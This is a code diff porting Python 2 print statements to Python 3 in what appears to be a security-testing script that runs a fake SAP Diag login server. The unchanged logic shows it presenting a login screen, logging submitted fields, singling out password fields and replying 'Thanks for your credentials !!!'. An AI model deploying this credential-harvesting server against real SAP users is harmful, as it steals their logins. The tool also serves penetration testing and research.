@@ -135,7 +135,7 @@ class SAPDiagServerHandler(SAPNIServerHandler):
                 ]
 
     def logoff(self):
-        print "[*] Logging off the client %s" % str(self.client_address)
+        print("[*] Logging off the client %s" % str(self.client_address))
         try:
             self.request.send(SAPDiag(com_flag_TERM_EOP=1, com_flag_TERM_EOC=1, compress=0))
             self.request.close()
@@ -145,10 +145,10 @@ class SAPDiagServerHandler(SAPNIServerHandler):
 
     def handle_data(self):
         if self.client_address in self.server.clients and self.server.clients[self.client_address].init:
-            print "[*] Already initialized client %s" % str(self.client_address)
+            print("[*] Already initialized client %s" % str(self.client_address))
             self.handle_msg()
         else:
-            print "[*] Uninitialized client %s" % str(self.client_address)
+            print("[*] Uninitialized client %s" % str(self.client_address))
             self.handle_init()
 
     def handle_init(self):
@@ -157,51 +157,51 @@ class SAPDiagServerHandler(SAPNIServerHandler):
         if SAPDiagDP in self.packet:
             self.server.clients[self.client_address].init = True
             self.server.clients[self.client_address].terminal = self.packet[SAPDiagDP].terminal
-            print "[*] Client %s set to initialized (terminal: %s)" % (str(self.client_address),
-                                                                       self.server.clients[self.client_address].terminal)
+            print("[*] Client %s set to initialized (terminal: %s)" % (str(self.client_address),
+                                                                       self.server.clients[self.client_address].terminal))
             self.request.send(SAPDiag(compress=0, message=self.make_login_screen()))
         else:
-            print "[-] Error during initialization of client %s" % str(self.client_address)
+            print("[-] Error during initialization of client %s" % str(self.client_address))
             self.logoff()
 
     def handle_msg(self):
-        print "[*] Received message from client %s" % str(self.client_address)
+        print("[*] Received message from client %s" % str(self.client_address))
         diag = self.packet[SAPDiag]
 
         # Handle exit transaction (OK CODE = /i)
         if len(diag.get_item("APPL", "VARINFO", "OKCODE")) > 0 and diag.get_item("APPL", "VARINFO", "OKCODE")[0].item_value == "/i":
-            print "[*] Windows closed by the client %s" % str(self.client_address)
+            print("[*] Windows closed by the client %s" % str(self.client_address))
             self.logoff()
 
         # Handle events (UI EVENT SOURCE)
         elif diag.get_item("APPL", "UI_EVENT", "UI_EVENT_SOURCE"):
-            print "[*] UI Event sent by the client %s" % str(self.client_address)
+            print("[*] UI Event sent by the client %s" % str(self.client_address))
             ui_event_source = diag.get_item("APPL", "UI_EVENT", "UI_EVENT_SOURCE")[0].item_value
 
             # Handle function key
             if ui_event_source.valid_functionkey_data:
                 # Handle logoff event
                 if ui_event_source.event_type == 7 and ui_event_source.control_type == 10 and ui_event_source.event_data == 15:
-                    print "[*] Logoff sent by the client %s" % str(self.client_address)
+                    print("[*] Logoff sent by the client %s" % str(self.client_address))
                     self.logoff()
 
                 # Handle enter event
                 elif ui_event_source.event_type == 7 and ui_event_source.control_type == 10 and ui_event_source.event_data == 0:
-                    print "[*] Enter sent by the client %s" % str(self.client_address)
+                    print("[*] Enter sent by the client %s" % str(self.client_address))
 
             # Handle menu option
             elif ui_event_source.valid_menu_pos:
-                print "[*] Menu event sent by the client %s" % str(self.client_address)
+                print("[*] Menu event sent by the client %s" % str(self.client_address))
 
             else:
-                print "[*] Other event sent by the client %s" % str(self.client_address)
+                print("[*] Other event sent by the client %s" % str(self.client_address))
 
         # Handle login request (DYNT Atom == \x00)
         atoms = diag.get_item(["APPL", "APPL4"], "DYNT", "DYNT_ATOM")
         if atoms:
-            print "[*] Login request sent by the client %s" % str(self.client_address)
+            print("[*] Login request sent by the client %s" % str(self.client_address))
             # Print the Atom items information
-            print "[*] Input fields:"
+            print("[*] Input fields:")
             for atom in [atom for atom_item in atoms for atom in atom_item.item_value.items]:
                 if atom.etype in [121, 122, 123, 130, 131, 132]:
                     text = atom.field1_text or atom.field2_text
@@ -209,16 +209,16 @@ class SAPDiagServerHandler(SAPNIServerHandler):
                     if atom.attr_DIAG_BSD_INVISIBLE and len(text) > 0:
                         # If the invisible flag was set, we're probably
                         # dealing with a password field
-                        print "[*]\tPassword field:\t%s" % (text)
+                        print("[*]\tPassword field:\t%s" % (text))
                     else:
-                        print "[*]\tRegular field:\t%s" % (text)
+                        print("[*]\tRegular field:\t%s" % (text))
 
-            print "[*] Sending error message to client %s" % str(self.client_address)
+            print("[*] Sending error message to client %s" % str(self.client_address))
             self.request.send(SAPDiag(compress=1, message=self.make_error_screen("Thanks for your credentials !!!")))
 
         # Otherwise we send an error message
         else:
-            print "[*] Sending error message to client %s" % str(self.client_address)
+            print("[*] Sending error message to client %s" % str(self.client_address))
             try:
                 self.request.send(SAPDiag(compress=0, message=self.make_error_screen("E: Unable to process your request, try later")))
             except error:
@@ -271,17 +271,17 @@ def main():
     if options.verbose:
         logging.basicConfig(level=logging.DEBUG)
 
-    print "[*] Setting up the Diag server on %s:%d" % (options.local_host, options.local_port)
+    print("[*] Setting up the Diag server on %s:%d" % (options.local_host, options.local_port))
     server = SAPDiagThreadedServer((options.local_host, options.local_port),
                                    SAPDiagServerHandler,
                                    base_cls=SAPDiag)
     server.allow_reuse_address = True
     server.options = options
-    print "[*] Waiting for clients ..."
+    print("[*] Waiting for clients ...")
     try:
         server.serve_forever()
     except KeyboardInterrupt:
-        print "[*] Canceled by the user ..."
+        print("[*] Canceled by the user ...")
         server.shutdown()
 
 
